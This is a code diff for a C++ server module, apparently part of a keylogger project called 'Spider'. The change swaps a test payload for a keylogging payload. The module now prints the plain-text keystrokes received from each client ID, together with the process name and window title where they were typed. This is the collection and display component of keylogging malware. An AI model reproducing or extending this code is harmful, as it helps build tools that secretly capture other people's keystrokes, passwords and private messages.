@@ -10,21 +10,24 @@
 #include "../Interfaces/ISpiderBusinessModule.hpp"
 #include "../Interfaces/ISpiderEventListener.hpp"
 #include "../SpiderEventManager/SpiderEventListener.hpp"
-#include "../ProtoEnvelopes/Proto/test.pb.h"
 #include "../Serialization/SpiderSerializer.hpp"
 #include "../SpiderEventManager/SpiderEventEmitter.hpp"
+#include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
 
 class OutputSTDOUTModule : public ISpiderBusinessModule {
-    std::unique_ptr<ISpiderEventListener<testPayload>> _eventListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
+    std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
     std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());
 private:
 
 public:
     OutputSTDOUTModule() {
-        _eventListener->Register("testPayload", [&](std::string clientId, testPayload &payload) {
-            std::cout << "Message from ID : " << clientId << " Payload is : " << payload.content() << std::endl;
-            auto enveloppe = SpiderSerializer::CreateResponseFromPayload(clientId, payload);
-            _eventEmitter->Emit("SpiderNetworkManager", enveloppe);
+        _eventListener->Register("testPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
+            std::cout << "---------------------------------------------------" << std::endl;
+            std::cout << "[Keylogging from client with ID " << clientId << "]" << std::endl;
+            if (payload.context().processname() != "" && payload.context().windowsname() != "")
+                std::cout << "From context : [Process : " << payload.context().processname() << "; Windows : " << payload.context().windowsname() <<"]" << std::endl;
+            std::cout << "==> " << payload.plaintextkeylog() << std::endl;
+            std::cout << "---------------------------------------------------" << std::endl;
         });
     }
 };
